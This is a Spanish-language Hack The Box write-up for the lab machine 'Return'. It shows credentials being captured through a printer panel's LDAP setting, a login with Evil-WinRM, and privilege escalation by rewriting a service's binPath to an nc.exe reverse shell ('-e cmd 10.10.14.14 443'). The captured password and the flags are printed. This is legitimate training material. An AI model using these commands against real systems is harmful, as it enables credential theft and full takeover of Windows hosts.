---
layout: single
title: Return - Hack The Box
excerpt: "En este post vamos a estar resolviendo la maquina Return de Hackthebox donde vamos a estar enumerando primero por SMB pero no encontramos nada después por el puerto 80 que esta corriendo un servicio web encontraremos un servicio de una impresora el cual podemos modificar un campo el cual pondremos nuestra ip y nos pondremos en escucha en un puerto para que nos obtener credenciales de un usuario al igual usaremos wireshark para analizar el trafico y ver como viaja todo por detrás con las credenciales nos conectaremos con evil-wirm y para la escalada de privilegios estaremos abusando de que estamos en el grupo Server Operators y podemos para y arrancar servicios"
date: 2023-07-20
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-return/icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:  
  - Abusing Printer
  - Abusing Server Operators Group
  - Service Configuration Manipulation
---

<p align="center">
<img src="/assets/images/htb-writeup-return/banner.png">
</p>

```bash
❯ ping -c 1 10.129.95.241
PING 10.129.95.241 (10.129.95.241) 56(84) bytes of data.
64 bytes from 10.129.95.241: icmp_seq=1 ttl=127 time=152 ms

--- 10.129.95.241 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 152.077/152.077/152.077/0.000 ms
❯ whichSystem.py 10.129.95.241

10.129.95.241 (ttl -> 127): Windows
```

## PortScan 

```bash
❯ nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49671,49674,49675,49677,49680,49697 10.129.95.241 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-20 19:21 CST
Nmap scan report for 10.129.95.241
Host is up (0.15s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: HTB Printer Admin Panel
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-07-21 01:40:26Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
|_clock-skew: 18m32s
| smb2-time: 
|   date: 2023-07-21T01:41:23
|_  start_date: N/A
```

## Enumeracion

Tenemos varios puertos abiertos pero vamos a comenzar viendo a que nos estamos enfrentando

```bash
❯ crackmapexec smb 10.129.95.241
SMB         10.129.95.241   445    PRINTER          [*] Windows 10.0 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
```

Vamos a comenzar por `smb` primero vamos a ver si podemos ver recursos compartidos podemos hacerlo con la misma herramienta `crackmapexec`

```bash
❯ crackmapexec smb 10.129.95.241 --shares
SMB         10.129.95.241   445    PRINTER          [*] Windows 10.0 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
SMB         10.129.95.241   445    PRINTER          [-] Error enumerating shares: SMB SessionError: STATUS_USER_SESSION_DELETED(The remote user session has been deleted.)
```

Pero nada bueno podemos probar con otras herramientas

```bash
❯ smbmap -H 10.129.95.241
[+] IP: 10.129.95.241:445	Name: 10.129.95.241                                     
❯ smbclient -L 10.129.95.231 -N
do_connect: Connection to 10.129.95.231 failed (Error NT_STATUS_HOST_UNREACHABLE)
```

Pues bueno vimos que el puerto `80` esta abierto vamos a ver el contenido de lo que existe en la web 

```ruby
❯ whatweb http://10.129.95.241
http://10.129.95.241 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.129.95.241], Microsoft-IIS[10.0], PHP[7.4.13], Script, Title[HTB Printer Admin Panel], X-Powered-By[PHP/7.4.13]
```

Esto es lo que hay en la `web`

![](/assets/images/htb-writeup-return/web1.png)

Pues como tal es una impresora si revisamos las **extensiones** vemos que `settings.php` encontramos un nombre de usuario

![](/assets/images/htb-writeup-return/web2.png)

Vamos aplicar `Fuzzing` para ver si es la única **ruta** interesante

```bash
❯ feroxbuster -t 200 -x php,txt,html -u http://10.129.95.241

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.95.241
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php, txt, html]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        2l       10w      151c http://10.129.95.241/images
301        2l       10w      151c http://10.129.95.241/Images
200     1345l     2796w    28274c http://10.129.95.241/index.php
200     1376l     2855w    29090c http://10.129.95.241/settings.php
301        2l       10w      151c http://10.129.95.241/IMAGES
200     1376l     2855w    29090c http://10.129.95.241/Settings.php
200     1345l     2796w    28274c http://10.129.95.241/Index.php
[####################] - 2m    479984/479984  0s      found:7       errors:134    
[####################] - 2m    119996/119996  688/s   http://10.129.95.241
[####################] - 2m    119996/119996  690/s   http://10.129.95.241/images
[####################] - 2m    119996/119996  688/s   http://10.129.95.241/Images
[####################] - 2m    119996/119996  708/s   http://10.129.95.241/IMAGES
```

Pero bueno no vemos nada interesante si inspeccionamos la parte de `password` vemos que no solo `*`

![](/assets/images/htb-writeup-return/web3.png)

## LDAP Credentials

Algo que podemos hacer es cambiar el `Server Address` a poner nuestra `IP` y estar en escucha por el puerto `389` con `netcat` para ver si recibimos algo 

```bash
❯ nc -nlvp 389
Listening on 0.0.0.0 389
```

Al igual que podemos estar capturando trafico para analizar la captura con `wireshark`

```bash
❯ tcpdump -i tun0 -w Captura.cap -v
tcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
Got 0
```

Ahora solo le damos a `update`

Y recibimos al parecer una contraseña 

```bash
❯ nc -nlvp 389
Listening on 0.0.0.0 389
Connection received on 10.129.95.241 55720
0*`%return\svc-printer
                      1edFg43012!!
```

Y también recibimos trafico

```bash
❯ tcpdump -i tun0 -w Captura.cap -v
tcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
^C14 packets captured
```

Ahora vamos abrir la captura con `wireshark`

```bash
❯ wireshark -r Captura.cap &>/dev/null & disown
[1] 56513
```

Vemos que las credenciales son de `ldap` `1edFg43012!!` esta realizando una `autenticacion`

![](/assets/images/htb-writeup-return/web5.png)

Vamos a ver si las credenciales se reutilizan y podemos ver recursos compartidos por `smb`

```bash
❯ crackmapexec smb 10.129.95.241 -u svc-printer -p '1edFg43012!!'
SMB         10.129.95.241   445    PRINTER          [*] Windows 10.0 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
SMB         10.129.95.241   445    PRINTER          [+] return.local\svc-printer:1edFg43012!! 
```

Ahora podemos ver los recursos compartidos por `smb`

```bash
❯ smbclient -L //10.129.95.241/ -U svc-printer
Password for [WORKGROUP\svc-printer]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```

Pero como tal no hay un recursos

```bash
❯ crackmapexec smb 10.129.95.241 -u svc-printer -p '1edFg43012!!' --shares
SMB         10.129.95.241   445    PRINTER          [*] Windows 10.0 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
SMB         10.129.95.241   445    PRINTER          [+] return.local\svc-printer:1edFg43012!! 
SMB         10.129.95.241   445    PRINTER          [+] Enumerated shares
SMB         10.129.95.241   445    PRINTER          Share           Permissions     Remark
SMB         10.129.95.241   445    PRINTER          -----           -----------     ------
SMB         10.129.95.241   445    PRINTER          ADMIN$          READ            Remote Admin
SMB         10.129.95.241   445    PRINTER          C$              READ,WRITE      Default share
SMB         10.129.95.241   445    PRINTER          IPC$            READ            Remote IPC
SMB         10.129.95.241   445    PRINTER          NETLOGON        READ            Logon server share 
SMB         10.129.95.241   445    PRINTER          SYSVOL          READ            Logon server share 
```

## Shell as svc-printer

Si verificamos si las credenciales se reutilizan para conectarnos con `evil-winrm` vemos que si 

```bash
❯ crackmapexec winrm 10.129.95.241 -u svc-printer -p '1edFg43012!!'
SMB         10.129.95.241   5985   PRINTER          [*] Windows 10.0 Build 17763 (name:PRINTER) (domain:return.local)
HTTP        10.129.95.241   5985   PRINTER          [*] http://10.129.95.241:5985/wsman
WINRM       10.129.95.241   5985   PRINTER          [+] return.local\svc-printer:1edFg43012!! (Pwn3d!)
```

Ahora nos conectamos y estamos en la maquina victima

```bash
❯ evil-winrm -i 10.129.95.241 -u svc-printer -p '1edFg43012!!'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-printer\Documents> whoami
return\svc-printer
*Evil-WinRM* PS C:\Users\svc-printer\Documents> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : .htb
   IPv6 Address. . . . . . . . . . . : dead:beef::e8
   IPv6 Address. . . . . . . . . . . : dead:beef::f08b:84bd:2540:f169
   Link-local IPv6 Address . . . . . : fe80::f08b:84bd:2540:f169%10
   IPv4 Address. . . . . . . . . . . : 10.129.95.241
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:7437%10
                                       10.129.0.1
*Evil-WinRM* PS C:\Users\svc-printer\Documents> 
```

## User flag

Ahora buscamos la **flag** y podemos verla

```bash
*Evil-WinRM* PS C:\Users\svc-printer\Documents> type C:\Users\svc-printer\Desktop\user.txt
43223ad01387c3d15f47aed81648bfaa
*Evil-WinRM* PS C:\Users\svc-printer\Documents> 
```

## Escalada de privilegios

Vemos que tenemos varios privilegios entre ellos uno interesante es este `SeLoadDriverPrivilege`

```bash
*Evil-WinRM* PS C:\Users\svc-printer\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeLoadDriverPrivilege         Load and unload device drivers      Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled
*Evil-WinRM* PS C:\Users\svc-printer\Documents> 
```

Estamos en varios grupos

```bash
*Evil-WinRM* PS C:\Users\svc-printer\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
BUILTIN\Print Operators                    Alias            S-1-5-32-550 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
*Evil-WinRM* PS C:\Users\svc-printer\Documents> 
```

Estamos en el grupo `server operators` <https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#server-operators>

![](/assets/images/htb-writeup-return/web6.png)

Tenemos la capacidad de parar y arrancar un servicio como nos dicen el la web 

Lo que vamos a hacer primero es subir el `netcat`

```bash
❯ cp /usr/share/seclists/Web-Shells/FuzzDB/nc.exe .
```

```bash
*Evil-WinRM* PS C:\Users\svc-printer\Documents> upload nc.exe
                                        
Info: Uploading /home/miguel7/Hackthebox/Return/nmap/nc.exe to C:\Users\svc-printer\Documents\nc.exe
                                        
Data: 37544 bytes of 37544 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\svc-printer\Documents> 
```

Vamos a crear un servicio que haga que nos envié una reverse shell a nuestro equipo

Pero nos dice que no se puede

```bash
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe create reverse binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd 10.10.14.14 443"
[SC] OpenSCManager FAILED 5:

Access is denied.

*Evil-WinRM* PS C:\Users\svc-printer\Documents> 
```

## Shell as nt authority system 

Como tenemos la capacidad de parar y arrancar servicios vamos a manipular el de una que ya exista

```bash
*Evil-WinRM* PS C:\Users\svc-printer\Documents> services

Path                                                                                                                 Privileges Service          
----                                                                                                                 ---------- -------          
C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe                                                                  True ADWS             
\??\C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{5533AFC7-64B3-4F6E-B453-E35320B35716}\MpKslDrv.sys       True MpKslceeb2796    
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                                                              True NetTcpPortSharing
C:\Windows\SysWow64\perfhost.exe                                                                                           True PerfHost         
"C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"                                                False Sense            
C:\Windows\servicing\TrustedInstaller.exe                                                                                 False TrustedInstaller 
"C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"                                                     True VGAuthService    
"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                                                                        True VMTools          
"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\NisSrv.exe"                                             True WdNisSvc         
"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\MsMpEng.exe"                                            True WinDefend        
"C:\Program Files\Windows Media Player\wmpnetwk.exe"                                                                      False WMPNetworkSvc    

*Evil-WinRM* PS C:\Users\svc-printer\Documents>
```

Ahora vamos a manipular uno 

```bash
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe config VMTools binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd 10.10.14.14 443"
[SC] ChangeServiceConfig SUCCESS
*Evil-WinRM* PS C:\Users\svc-printer\Documents> 
```

Nos ponemos en escucha

```bash
❯ rlwrap nc -lvnp 443
Listening on 0.0.0.0 443
```

Y como la tarea es privilegiada ala hora de arrancar el servicio nos va enviar la **reverse shell**

Primero vamos a parar el servicio 

```bash
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe stop VMTools

SERVICE_NAME: VMTools
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
*Evil-WinRM* PS C:\Users\svc-printer\Documents> 
```

Ahora lo arrancamos

```bash
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe start VMTools
```

Y recibimos la shell 

```bash
❯ rlwrap nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.129.95.241 55672
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

whoami
whoami
nt authority\system

C:\Windows\system32>
```

## root flag

```bash
type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
d85fffc0c733cc167c158e77fe6eeda2

C:\Windows\system32>
```
